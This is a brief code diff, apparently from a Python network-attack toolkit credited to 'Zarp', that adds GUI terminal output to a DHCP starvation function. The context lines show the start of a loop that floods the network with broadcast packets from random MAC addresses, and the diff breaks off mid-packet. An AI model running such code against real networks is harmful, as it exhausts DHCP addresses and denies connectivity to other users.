@@ -2,8 +2,11 @@ from scapy.all import *
 
 '''THIS CODE IS NOT MINE! It has been borrowed from the "Zarp" program'''
 
-def DHCPstarvation():
-    print('[+] Starving network of DHCP resources')
+def DHCPstarvation(terminal=None):
+    if terminal == None:
+        print('[+] Starving network of DHCP resources')
+    else:
+        terminal.configure(text=terminal.cget("text")+'\n[+] Starving network of DHCP resources')
     while True:
         pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
         pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
